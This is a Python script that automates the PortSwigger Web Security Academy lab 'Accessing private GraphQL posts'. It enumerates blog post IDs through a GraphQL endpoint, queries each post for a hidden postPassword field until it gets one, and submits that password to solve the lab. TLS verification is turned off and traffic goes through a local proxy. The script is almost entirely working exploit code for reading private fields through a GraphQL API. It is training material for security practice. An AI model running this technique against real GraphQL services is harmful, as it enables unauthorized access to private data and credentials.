# Accessing private GraphQL posts

# https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def get_posts_num(s, url):
	print('\n[+] Trying to determine the number of posts in the GraphQL database...')
	api_path = url + '/graphql/v1'
	payload = {
	"query":"query getBlogSummaries {getAllBlogPosts {id}}"
}
	r = s.post(api_path, json=payload)
	print(r.text)
	num = len(re.findall(rb'"id":(.*)\n', r.text.encode()))
	return num + 1

def get_password(s, url, num):
	print('\n[+] Trying to retrieve the password in the Blog Posts data...')
	api_path = url + '/graphql/v1'
	for i in range(1, num):
		payload = {
	"query":f"query getBlogSummaries {{getBlogPost(id:{i}) {{postPassword }}}}"
}
		print(payload)
		r = s.post(api_path, json=payload)
		if re.search(rb'"postPassword": (.*)\n', r.text.encode()).group(1).decode() != "null":
			print(r.text)
			return re.search(rb'"postPassword": "(.*)"\n(.*)}', r.text.encode()).group(1).decode()

def submit_password(s, url, password):
	print('\n[+] Trying to submit the Password to solve the lab...')
	submit_path = url + '/submitSolution'
	submit_data = {"answer": password}
	r = s.post(submit_path, data=submit_data)
	return r


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Accessing private GraphQL posts')
	parser = argparse.ArgumentParser(description="[+] Lab: Accessing private GraphQL posts")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			num = get_posts_num(s, url)
			password = get_password(s, url, num)
			print(password)
			submit_password(s, url, password)
		s.cookies.clear()
		time.sleep(2)
		r = s.get(url)
		if 'Congratulations, you solved the lab!' in r.text:
			print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
